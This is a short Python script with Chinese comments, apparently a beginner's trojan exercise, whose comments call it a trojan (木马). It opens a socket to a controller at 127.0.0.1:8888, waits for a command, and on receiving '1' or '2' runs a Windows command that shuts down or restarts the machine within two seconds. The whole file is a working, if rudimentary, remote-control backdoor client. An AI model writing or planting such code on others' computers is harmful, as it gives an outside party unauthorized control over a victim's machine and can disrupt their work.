import os
import subprocess
from socket import*#导入网络编程的模块

#1.准备一个电话（套接字）
s = socket()

#2.套接字申请链接后台的电话号码
s.connect(('127.0.0.1',8888))#申请连接后台网络
#本机测试 木马127.0.0.1 本机回环地址
#如果不在同一个电脑上面弄的话用0.0.0.0?
choice = s.recv(1024).decode()#decode?将对面发过来的代码解码、
if choice == '1':
    subprocess.run("shutdown -s -t 2",encoding='utf-8')
    #关机
elif choice == '2':
    subprocess.run("shutdown -r -t 2", encoding='utf-8')

